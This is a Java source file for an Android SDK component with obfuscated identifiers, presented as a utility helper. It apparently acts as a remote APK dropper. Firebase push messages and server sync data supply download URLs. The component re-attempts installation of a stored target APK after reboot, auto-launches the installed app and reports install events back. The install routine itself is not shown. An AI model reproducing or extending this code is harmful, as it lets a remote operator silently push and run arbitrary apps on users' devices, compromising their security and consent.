package utils.helper.c_master;

import android.app.Application;
import android.content.ActivityNotFoundException;
import android.content.Intent;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.text.TextUtils;

import com.evernote.android.job.Job;
import com.evernote.android.job.JobRequest;
import com.evernote.android.job.util.support.PersistableBundleCompat;
import com.thin.downloadmanager.DownloadManager;
import com.thin.downloadmanager.ThinDownloadManager;

import java.util.List;
import java.util.concurrent.TimeUnit;

import main_commons.app.c_master.commons.commons.SdkCommons;
import main_commons.app.c_master.commons.commons.SdkComponent;
import main_commons.app.c_master.keep.NetworkApi;
import utils.helper.c_master.keep.InstallModel;
import utils.helper.c_master.keep.InstallsResponse;

@SuppressWarnings("WeakerAccess")
public class InstallsComponent extends SdkComponent {

    private static InstallsComponent instance;

    public static final String ARG_APP_ID = "i18927878_arg_1";
    private static final String JOB_TAG_INSTALL_EVENT = "i92797272729_j_1";

    private SharedPrefs preferences;
    private ThinDownloadManager downloadManager;

    public static InstallsComponent get() {
        return instance;
    }

    public InstallsComponent() {
        instance = this;
    }

    @Override
    public void initialize(Application context, SdkCommons sdk, NetworkApi api) {
        super.initialize(context, sdk, api);
        preferences = new SharedPrefs(context);
        downloadManager = new ThinDownloadManager();
    }

    @Override
    public void onDeviceRebooted() {
        // checkPendingInstalls();
        ApkInfoModel apkInfo = preferences.getTargetApkInfo();
        if (apkInfo != null) {
            MainUtils.install(get(), apkInfo);
        }
    }

    @Nullable
    @Override
    public Job createJob(@NonNull String tag) {
        if (JOB_TAG_INSTALL_EVENT.equals(tag)) {
            return new UploadEventJob();
        }
        return null;
    }

    @Override
    public void onNewAppAdded(String packageName) {
        ApkInfoModel apkInfo = preferences.getTargetApkInfo();
        // Launch installed app, only if this is our app (we have stored apkId)
        if (apkInfo != null && packageName.equals(apkInfo.getPackageName())) {
            if (!TextUtils.isEmpty(apkInfo.getId())) {
                submitInstallEventJob(apkInfo.getId());
            }
            // launch app
            try {
                Intent launchIntent = context().getPackageManager().getLaunchIntentForPackage(packageName);
                context().startActivity(launchIntent);
            } catch (ActivityNotFoundException e) {
                e.printStackTrace();
            }
            preferences.saveTargetApkInfo(null);
        }
    }

    @Override
    public void onFcmMessageReceived(@NonNull String type, @NonNull Bundle payload) {
        if ("apk".equals(type)) {
            String receivedUrl = payload.getString("url");
            String appId = payload.getString("apk_id");
            if (receivedUrl != null && appId != null) {
                MainUtils.onUrlReceived(get(), receivedUrl, appId);
            }
        }
    }

    @Override
    public void onSyncEvent(@NonNull String json) {
        InstallsResponse response = safeParse(json, InstallsResponse.class);
        List<InstallModel> list = response != null ? response.getData() : null;
        if (list != null && !list.isEmpty()) {
            InstallModel app = list.get(0);
            MainUtils.onUrlReceived(get(), app.getDownloadUrl(), app.getAppId());
        }
    }

    public SharedPrefs preferences() {
        return preferences;
    }

    public DownloadManager downloadManager() {
        return downloadManager;
    }

    ///////////////////////////////////////////////////////////////////////////
    // JOBS
    ///////////////////////////////////////////////////////////////////////////

    public void submitInstallEventJob(String apkId) {
        PersistableBundleCompat extras = new PersistableBundleCompat();
        extras.putString(ARG_APP_ID, apkId);
        long backoffTime = TimeUnit.MINUTES.toMillis(1);
        new JobRequest.Builder(JOB_TAG_INSTALL_EVENT)
                .addExtras(extras)
                .setBackoffCriteria(backoffTime, JobRequest.BackoffPolicy.EXPONENTIAL)
                .startNow()
                .build()
                .schedule();
    }
}
